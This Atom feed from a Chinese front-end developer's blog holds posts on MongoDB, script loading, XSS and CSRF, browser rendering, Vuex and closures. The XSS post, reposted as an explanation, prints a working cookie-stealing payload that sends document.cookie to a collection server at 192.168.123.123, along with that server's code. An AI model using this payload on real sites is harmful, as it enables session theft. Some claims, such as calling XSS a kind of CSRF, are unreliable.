<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>时间追逐者</title>
  <subtitle>前端开发</subtitle>
  <link href="/blog/atom.xml" rel="self"/>
  
  <link href="https://ganchengyuan1990.github.io/blog/"/>
  <updated>2017-01-20T09:17:24.536Z</updated>
  <id>https://ganchengyuan1990.github.io/blog/</id>
  
  <author>
    <name>Jason Gan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初识mongodb</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/20/%E5%88%9D%E8%AF%86mongodb/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/20/初识mongodb/</id>
    <published>2017-01-20T01:14:53.000Z</published>
    <updated>2017-01-20T09:17:24.536Z</updated>
    
    <content type="html"><![CDATA[<h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>传说中的非关系数据库，颠覆了我们在大学时学数据库时的三观，虽说那时并非所有的数据库都是关系型数据库，但起码有一统江湖的感觉。</p>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm i mongo</div></pre></td></tr></table></figure>
<p>另外，还有一个非常重要的步骤，要在命令行中执行 mongod –dbpath “D:\vue\vue-wechat\server”  D:\vue\vue-wechat\server换成需要启动服务的位置，也就是你项目的server文件夹。这个命令相当于打开MONGODB的服务界面，让其进入服务状态。</p>
<h2 id="server-JS维护"><a href="#server-JS维护" class="headerlink" title="server JS维护"></a>server JS维护</h2><p>```javascript<br>const mongodb = require(‘mongodb’);<br>const  server  = new mongodb.Server(‘localhost’, 27017, {auto_reconnect:true});<br>var  db = new mongodb.Db(‘XXXX’, server, {safe:true}); //XXXX可以改成任意名字</p>
<p>const hostname = ‘127.0.0.1’;<br>const port = 9001; //port注意不要和已启动的服务端口重合，比如PHP常用的9000，VUE常用的8080</p>
<p>http.createServer((req, res) =&gt; {<br>  var json;<br>  var _callbackName = req.url.substr(req.url.indexOf(‘=’) + 1);</p>
<p>  http.get(‘XXXXXXXX’, (response) =&gt; {<br>    response.setEncoding(‘utf8’);<br>    response.on(‘data’, (data) =&gt; {<br>     // json = data;<br>      res.end(_callbackName + “(“ + data + “)”);</p>
<pre><code>  res._tempData = data;

  db.open( (err, db) =&gt;{
        if (!err) {
            console.log(&apos;connect db&apos;);
            //数据库连接
            db.createCollection(&apos;test&apos;, { safe: true }, (err, collection) =&gt; {
                debugger
                if (err) {
                    console.log(err);
                } else {
                    var tmp1 = JSON.parse(res._tempData);
                    collection.insert([tmp1], { safe: true }, function(err, result) {
                        console.log(result);
                    });
                    /*collection.remove({title: &quot;world&quot;}, function(err, count) {
                        // console.log(count);
                    })*/
                    collection.find().toArray(function(err, docs) {
                        console.log(&apos;find&apos;);
                        console.log(docs);
                    });

                    db.close();
                    /*collection.findOne(function(err, doc) {
                        console.log(&apos;findOne&apos;);
                        console.log(doc);
                    });*/

                }

            });
        } else {
            console.log(err);
        }
  });

});  
</code></pre><p>  });<br>}).listen(port, hostname, () =&gt; {<br>  console.log(<code>Server running at http://${hostname}:${port}/</code>);<br>});</p>
<font color="red">总结一下，总的来说非常简单，不知效率如何，我的猜想，应该是比较适合层次较少的JSON数据结构。</font>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;mongodb&quot;&gt;&lt;a href=&quot;#mongodb&quot; class=&quot;headerlink&quot; title=&quot;mongodb&quot;&gt;&lt;/a&gt;mongodb&lt;/h3&gt;&lt;p&gt;传说中的非关系数据库，颠覆了我们在大学时学数据库时的三观，虽说那时并非所有的数据库都是关系型数据库，
    
    </summary>
    
    
      <category term="后端" scheme="https://ganchengyuan1990.github.io/blog/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Js 载入defer和async方式的区别</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/19/Js-%E8%BD%BD%E5%85%A5defer%E5%92%8Casync%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/19/Js-载入defer和async方式的区别/</id>
    <published>2017-01-19T06:06:49.000Z</published>
    <updated>2017-01-19T06:07:30.385Z</updated>
    
    <content type="html"><![CDATA[<p>async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。</p>
<ol>
<li>defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）</li>
<li>它俩的差别在于脚本下载完之后何时执行，显然 defer 是最接近我们对于应用脚本加载和执行的要求的</li>
<li>关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的，这一点要善加利用</li>
<li>async 则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行</li>
<li>仔细想想，async 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）&lt;/li&gt;
&lt;li&gt;它俩的差别在于脚本下载完之后何时执行，显然 
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>XSS和CSRF对比</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/19/XSS%E5%92%8CCSRF%E5%AF%B9%E6%AF%94/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/19/XSS和CSRF对比/</id>
    <published>2017-01-19T01:11:30.000Z</published>
    <updated>2017-01-19T05:58:38.028Z</updated>
    
    <content type="html"><![CDATA[<font color="grey">转载：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></font>

<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line"></div><div class="line">"""javascript</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line"></div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>然后在某一个页面的评论中注入这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt;  包起来放在评论中</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure></p>
<font color="red">个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;grey&quot;&gt;转载：&lt;a href=&quot;https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.tonyse
    
    </summary>
    
    
      <category term="网络相关" scheme="https://ganchengyuan1990.github.io/blog/tags/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>html render &amp; paint（重排和重绘）</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/18/html-render-paint/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/18/html-render-paint/</id>
    <published>2017-01-18T03:05:38.000Z</published>
    <updated>2017-01-19T05:35:28.903Z</updated>
    
    <content type="html"><![CDATA[<p>首先，先吐槽一下weex学习社区的内容真的非常不全面，自学很难，优点是调试相对简单，暂时放一放，以后有空再看看。</p>
<hr>
<p>接下来进入正题，讲一讲昨天刚复习的有关<font color="red">浏览器页面渲染</font>的知识点。</p>
<p>##repaint、reflow/relayout、restyle</p>
<p>这四个概念分别代表什么？先来看一张图，了解一下浏览器页面的渲染过程<br><img src="http://images.cnitblog.com/blog/595796/201408/211743255813505.png"></p>
<font color="red">这里要注意的是：</font>要生成Dom Tree和Css Tree以后才会生成render tree，然后进行绘制(paint)。<br><br>1. 首先，浏览器解析HTML源码构建DOM树，在DOM树中，每个HTML标签都有对应的节点，并且在介于两个标签中间的文字块也对应一个text节点。DOM树的根节点是documentElement，也就是<html>标签；<br>2. 然后，浏览器对CSS代码进行解析，一些当前浏览器不能识别的CSS hack写法（如-moz-/-webkit等前缀，以及IE下的/_等）将会被忽略。CSS样式的优先级如下：最低的是浏览器的默认样式，然后是通过<link>、import引入的外部样式和行内样式，最高级的是直接写在标签的style属性中的样式；<br>3. 随后将进入非常有趣的环节-构建渲染树。渲染树跟DOM树结构相似但并不完全匹配。渲染树会识别样式，所以如果通过设置display:none隐藏的标签是不会被渲染树引入的。同样的规则适用于<head>标签以及其包含的所有内容。另外，在渲染树中可能存在多个渲染节点（渲染树中的节点称为渲染节点）映射为一个DOM标签，例如，多行文字的<p>标签中的每一行文字都会被视为一个单独的渲染节点。渲染树的一个节点也称为frame-结构体，或者盒子-box（与CSS盒子类似）。每个渲染节点都具有CSS盒子的属性，如width、height、border、margin等；<br>4. 最后，等待渲染树构建完毕后，浏览器便开始将渲染节点一一绘制-paint到屏幕上。。<br><br>OK，接下来看一个例子<br><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Beautiful page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    </div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">    Once upon a time there was </div><div class="line">    a looong paragraph...</div><div class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span></div><div class="line">    Secret message</div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">  </div><div class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"..."</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">  ...</div><div class="line"> </div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><br><br>这个html对应的DOM结构如下：<br><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">documentElement (html)</div><div class="line">    head</div><div class="line">        title</div><div class="line">    body</div><div class="line">        p</div><div class="line">            [text node]</div><div class="line">        </div><div class="line">        div </div><div class="line">            [text node]</div><div class="line">        </div><div class="line">        div</div><div class="line">            img</div><div class="line">        </div><div class="line">        ...</div></pre></td></tr></table></figure><br><br>由于渲染树会忽略head内容和隐藏的节点，并且会将</p><p>中的多行文字按行数映射为单独的渲染节点，故构建完成的渲染树结构如下：<br><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root (RenderView)</div><div class="line">    body</div><div class="line">        p</div><div class="line">            line 1</div><div class="line">        line 2</div><div class="line">        line 3</div><div class="line">        ...</div><div class="line">        </div><div class="line">    div</div><div class="line">        img</div><div class="line">        </div><div class="line">    ...</div></pre></td></tr></table></figure><br><br><br><br>## 重绘-repaint和回流（重排）-reflow<br><br>同一时间内至少存在一个页面初始化layout行为和一个绘制行为（除非你的页面是空白页-blank）。在此之后，改变任何影响构造渲染树的行为都会触发以下一种或者多种动作：<br><br>1.  渲染树的部分或者全部将需要重新构造并且渲染节点的大小需要重新计算。这个过程叫做回流-reflow，或者layout，或者layouting（靠，能不能愉快的翻译了，是不是还来个过去式啊?!），或者relayout（这词是原文作者杜撰的，为了标题中多个“R”）。浏览器中至少存在一个reflow行为-即页面的初始化layout；<br>2.  屏幕的部分区域需要进行更新，要么是因为节点的几何结构改变，要么是因为格式改变，如背景色的变化。屏幕的更新行为称作重绘-repaint，或者redraw。<br><br><br><br>## 如何减少重绘和回流<br>减少因为重绘和回流引起的糟糕用户体验的本质是尽量减少重绘和回流，减少样式信息的set行为。可以通过以下几点来优化：<br>1.  不要逐个修改多个样式。对于静态样式来说，最明智和易维护的代码是通过改变classname来控制样式；而对于动态样式来说，通过一次修改节点的cssText来代替样式的逐个改变。<br>2.  “离线”处理多个DOM操作。“离线”的意思是将需要进行的DOM操作脱离DOM树，比如：<br><em> 通过documentFragment集中处理临时操作；
</em> 将需要更新的节点克隆，在克隆节点上进行更新操作，然后把原始节点替换为克隆节点；<br>* 先通过设置display:none将节点隐藏（此时出发一次回流和重绘），然后对隐藏的节点进行100个操作（这些操作都会单独触发回流和重绘），完毕后将节点的display改回原值（此时再次触发一次回流和重绘）。通过这种方法，将100次回流和重绘缩减为2次，大大减少了消耗<br>3. 不要过多进行重复的样式计算操作。如果你需要重复利用一个静态样式值，可以只计算一次，用一个局部变量储存，然后利用这个局部变量进行相关操作。<br>4. 总之，当你在打算改变样式时，首先考虑一下渲染树的机制，并且评估一下你的操作会引发多少刷新渲染树的行为。例如，我们知道一个绝对定位的节点是会脱离文档流，所以当对此节点应用动画时不会对其他节点产生很大影响，当绝对定位的节点置于其他节点上层时，其他节点只会触发重绘，而不会触发回流。<br><br><br><br>## restyle到底是什么？<br>仔细的朋友会发现，到现在我们也没具体说restyle的情况，<font color="red">restyle指的是没有几何结构改变的渲染树变化。也就是说restyle和reflow是一个层次的概念，完成以后都会引发repaint!</font>

</p><p><br></p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>重新计算渲染树的行为被Mozilla称为回流-reflow，被其他浏览器称为layout；<br>将重新计算后的渲染树更新到屏幕的行为叫做重绘-repaint，或者redraw（in IE/DynaTrace）；</p>
</head></html>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先，先吐槽一下weex学习社区的内容真的非常不全面，自学很难，优点是调试相对简单，暂时放一放，以后有空再看看。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;接下来进入正题，讲一讲昨天刚复习的有关&lt;font color=&quot;red&quot;&gt;浏览器页面渲染&lt;/font&gt;的知识点。&lt;/p&gt;
&lt;p&gt;##re
    
    </summary>
    
    
      <category term="css" scheme="https://ganchengyuan1990.github.io/blog/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>vuex初探</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/17/vuex%E5%88%9D%E6%8E%A2/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/17/vuex初探/</id>
    <published>2017-01-17T02:27:29.000Z</published>
    <updated>2017-01-19T05:37:03.142Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Vuex的作用是什么"><a href="#Vuex的作用是什么" class="headerlink" title="Vuex的作用是什么"></a>Vuex的作用是什么</h3><p>Vuex主要用来进行状态管理，我的理解就是当你的VUE项目大到一定程度以后，需要一个帮手来帮助你进行组件管理，尤其是多层次的组件进行信息交互时，如果没有这样一个工具，就得维护公共变量或者一层一层传递参数，这个过程是非常令人不愉悦的。</p>
<h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actions <span class="keyword">from</span> <span class="string">'./actions'</span>; <span class="comment">//改变状态都得通过这里的方法</span></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> getters <span class="keyword">from</span> <span class="string">'./getters'</span>; <span class="comment">//获取状态值的方法</span></div></pre></td></tr></table></figure>
<h2 id="store对象"><a href="#store对象" class="headerlink" title="store对象"></a>store对象</h2><p>这个对象就是Vuex创建的实例对象，是重点需要学习的内容。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">const</span> store = &#123;</div><div class="line">	<span class="comment">//state对象维护具体状态值</span></div><div class="line">    state: &#123;</div><div class="line">        <span class="attr">isInitData</span>: <span class="literal">true</span>, <span class="comment">//首次刷新页面</span></div><div class="line">    &#125;,</div><div class="line">    <span class="comment">/**</span></div><div class="line">     * vuex 2.0 action should be await Vuex规定每个状态值的改变最后都要通过actions函数来操作，并且规定必须是异步，因此调取接口的操作应该都在这里</div><div class="line">     */</div><div class="line">    actions: &#123;</div><div class="line">        <span class="attr">fetchSearchDataAction</span>: <span class="function">(<span class="params">&#123; commit, dispatch &#125;, options</span>) =&gt;</span> &#123;</div><div class="line">            commit(<span class="string">'SET_TOP_LOADING'</span>, &#123; <span class="attr">type</span>: <span class="literal">true</span> &#125;)</div><div class="line">        &#125;,</div><div class="line"></div><div class="line">    &#125;,</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">     * even vuex 2.0 mutations should be async  actions 只是一个架构性的概念，并不是必须的，说到底只是一个函数，你在里面想干嘛都可以，只要最后触发 mutation 就行。</div><div class="line">     */</div><div class="line">    mutations: &#123;</div><div class="line"></div><div class="line">        [types.COMBINE_DETAIL_LIST](state, res) &#123;</div><div class="line"></div><div class="line">            <span class="keyword">let</span> cloneMerchandiseList = [];</div><div class="line"></div><div class="line">            state.merchandiseList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</div><div class="line"></div><div class="line">                    cloneMerchandiseList.push(<span class="built_in">Object</span>.assign(&#123;&#125;, item, res[item.sm_seq]));</div><div class="line"></div><div class="line">                &#125;)</div><div class="line">                <span class="comment">//combine 合并基础对象和详细属性,重现渲染列表</span></div><div class="line">            state.merchandiseList = cloneMerchandiseList;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line">    <span class="attr">getters</span>: &#123;</div><div class="line">        <span class="attr">listDownType</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</div><div class="line">            <span class="keyword">let</span> type = <span class="string">''</span></div><div class="line">            state.selectListData.filter(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</div><div class="line">                <span class="keyword">if</span>(item.isSelect)&#123;</div><div class="line">                    type = item.sortType</div><div class="line">                &#125;</div><div class="line">            &#125;)</div><div class="line">            <span class="keyword">return</span> type</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<font color="red">注：同步的意义在于这样每一个 mutation 执行完成后都可以对应到一个新的状态（和 reducer 一样），这样 devtools 就可以打个 snapshot 存下来，然后就可以随便 time-travel 了。</font>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Vuex的作用是什么&quot;&gt;&lt;a href=&quot;#Vuex的作用是什么&quot; class=&quot;headerlink&quot; title=&quot;Vuex的作用是什么&quot;&gt;&lt;/a&gt;Vuex的作用是什么&lt;/h3&gt;&lt;p&gt;Vuex主要用来进行状态管理，我的理解就是当你的VUE项目大到一定程度以后，
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
      <category term="Vue" scheme="https://ganchengyuan1990.github.io/blog/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>javascript闭包个人理解</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/17/javascript%E9%97%AD%E5%8C%85%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/17/javascript闭包个人理解/</id>
    <published>2017-01-17T00:56:37.000Z</published>
    <updated>2017-01-19T05:35:39.330Z</updated>
    
    <content type="html"><![CDATA[<p>个人理解，闭包的目的就是为了从外部读取内部函数的局部参数而设置的桥梁方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">1</span>;</div><div class="line">    nAdd=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;n+=<span class="number">1</span>; &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(n)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> inner;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> result = closure();</div><div class="line">result();</div><div class="line"></div><div class="line">nAdd();</div><div class="line">result(); <span class="comment">// 1000</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</div><div class="line">　　<span class="keyword">var</span> object = &#123;</div><div class="line">　　　　<span class="attr">name</span> : <span class="string">"My Object"</span>,</div><div class="line">　　　　<span class="attr">getNameFunc</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　　　<span class="keyword">return</span> <span class="keyword">this</span>.name;</div><div class="line">　　　　　　&#125;;</div><div class="line">　　　　&#125;</div><div class="line">　　&#125;;</div><div class="line">alert(object.getNameFunc()());</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;个人理解，闭包的目的就是为了从外部读取内部函数的局部参数而设置的桥梁方法。&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/di
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Vue个人网站搭建</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/16/%E7%AC%AC%E4%B8%80%E7%AF%87/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/16/第一篇/</id>
    <published>2017-01-16T09:13:04.353Z</published>
    <updated>2017-01-16T09:15:47.565Z</updated>
    
    <content type="html"><![CDATA[<p>  自学Vue也有将近一个月了，想做个简单的小作品，正好这段时间自己的阿里云服务器闲置着，而且个人域名一直缺一个主页面，自然就想到做一个小项目来改装一下门庭。</p>
<p>###手机预览(website)<br>  废话不多说，上预览，<a href="http://www.jasongan.cn" target="_blank" rel="external">http://www.jasongan.cn</a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h1 id="install-dependencies"><a href="#install-dependencies" class="headerlink" title="install dependencies"></a>install dependencies</h1><p>npm install</p>
<h1 id="serve-with-hot-reload-at-localhost-8080"><a href="#serve-with-hot-reload-at-localhost-8080" class="headerlink" title="serve with hot reload at localhost:8080"></a>serve with hot reload at localhost:8080</h1><p>npm run dev</p>
<h1 id="build-for-production-with-minification"><a href="#build-for-production-with-minification" class="headerlink" title="build for production with minification"></a>build for production with minification</h1><p>npm run build</p>
<p>```</p>
<h3 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h3><p>  vue-wechat是主要在利用Vue.js。</p>
<p>  此demo在实现上使用了以下技术</p>
